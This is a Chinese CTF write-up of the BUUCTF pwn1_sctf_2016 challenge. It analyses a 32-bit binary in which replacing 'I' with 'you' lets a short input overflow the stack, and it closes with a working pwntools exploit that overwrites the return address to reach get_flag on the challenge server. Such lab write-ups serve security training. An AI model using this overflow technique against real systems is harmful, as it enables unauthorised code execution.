## 0x01 前言

题目来自BUUCTF pwn。相关知识点总结是针对于题目写的，所以会比较简洁，如果想详细了解，知识点来源会在参考文献里给出链接^^。

## 0x02 审题

![image.png](https://image.3001.net/images/20220619/1655619594_62aec00ae4f81095135f2.png!small)  
直接对文件进行分析吧。

## 0x03 静态分析

### 3.1 checksec体检

![image.png](https://image.3001.net/images/20220619/1655619797_62aec0d58d7b4c0a44628.png!small)  
  

    
    
    Arch:     i386-32-little  （32位的程序）
    Stack:    No canary found （栈溢出关闭）
    PIE:      No PIE (0x400000)  （地址随机化关闭）
    

盲猜又是一个栈溢出的题。

### 3.2 IDA pro分析

#### 3.2.1 寻找目标

在左侧函数列表一下就看到了目标get_flag :  
![image.png](https://image.3001.net/images/20220619/1655620289_62aec2c18cdf380213522.png!small)![image.png](https://image.3001.net/images/20220619/1655620325_62aec2e548a1173ec913b.png!small)

#### 3.2.2 阅读源码

因为我的IDA是体验版，好像没有32位的功能，所以不能反汇编，所以权当锻炼阅读汇编代码吧/doge，main函数只调用了vuln，就直接来看vuln函数吧：  
![image.png](https://image.3001.net/images/20220619/1655620794_62aec4ba966ec296b2ebe.png!small)  
轻易的就看到了fgets函数，那么就确定是一个栈溢出的题目了，但是它输入的字节限制在20h以内。  
现在先去看一下var_3C这个变量距离返回地址有多远（其实IDA在这对变量的命名其实就它与ebp的距离）：  
![image.png](https://image.3001.net/images/20220619/1655621015_62aec5971ea3905974f75.png!small)  
![image.png](https://image.3001.net/images/20220619/1655621030_62aec5a6c3b20743494f7.png!small)  
也就是说，因为20h字节的限制是无法劫持到返回的值的，继续往下看吧：  
![image.png](https://image.3001.net/images/20220619/1655622020_62aec984cbd85657f758d.png!small)  
这里出现了replace函数，这个replace出题者自己写的，可以先不看代码，单看字面意思猜测是将I换成you，以不足之前20h字节不够的功能，接下来进入动态调试看一看就知道了。

## 0x04 动态调试

运行至replace函数停下，之前输入的参数为"III love you"：  
![image.png](https://image.3001.net/images/20220619/1655625013_62aed5354299ba7507e0e.png!small)  
![image.png](https://image.3001.net/images/20220619/1655625066_62aed56a3a33149f3687d.png!small)可以看到，运行replace函数之后，var_3C赋值给变量input里的“I”确实都变成了“you”，那么继续往下运行看看它是如何影响到栈中的：  
![image.png](https://image.3001.net/images/20220619/1655625505_62aed721773e3a5345a2d.png!small)运行拷贝函数之后：  
![image.png](https://image.3001.net/images/20220619/1655625561_62aed759af23f581b8254.png!small)  
那么现在逻辑就很清晰了，通过“I”变成“you”这样字节数的扩大，让我们能够劫持到函数返回点即：0x3C + (ebp) + (flag_addre) =
0x44个字节 = "a" * 0x3c + “aaaa”+ flag_addre = "I" * 0x14 + “aaaa”+ flag_addre  

## 0x05 Exp编写

    
    
    from pwn import *
    
    #p = process('./warmup_csaw_2016')
    
    p = remote('node4.buuoj.cn', 26552)
    #context.terminal = ['tmux','splitw', '-h']
    #context(arch = 'amd64' , os = 'linux', log_level="debug")
    
    flag_addre = 0x08048F0D
    ebp = 0x12345678
    payload = b'I'*0x14+p32(ebp)+p32(flag_addre)
    #gdb.attach(p, gdbscript="b *(0x40069e)")
    p.sendline(payload)
    
    p.interactive()
    

![image.png](https://image.3001.net/images/20220619/1655626846_62aedc5e6328fd9d86a8c.png!small)

## 0x06 知识点总结

### 汇编代码阅读速度

在此函数中，对寄存器的所有操作都是在为call服务，也就是说，call某个函数之前的操作都是在获取函数参数，将其放到esp上的单元，然后call
某个函数时，直接从esp地址往高地址依次取参数。所以阅读时可以先看浏览call了哪些函数，再具体看参数。

## 0x07 参考文献

[[BUUCTF]PWN4——pwn1_sctf_2016](https://blog.csdn.net/mcmuyanga/article/details/108202748)  
[std::string用法总结](https://blog.csdn.net/lanyzh0909/article/details/6957649)  
[C++中std::allocator的使用](https://blog.csdn.net/fengbingchun/article/details/78943527)

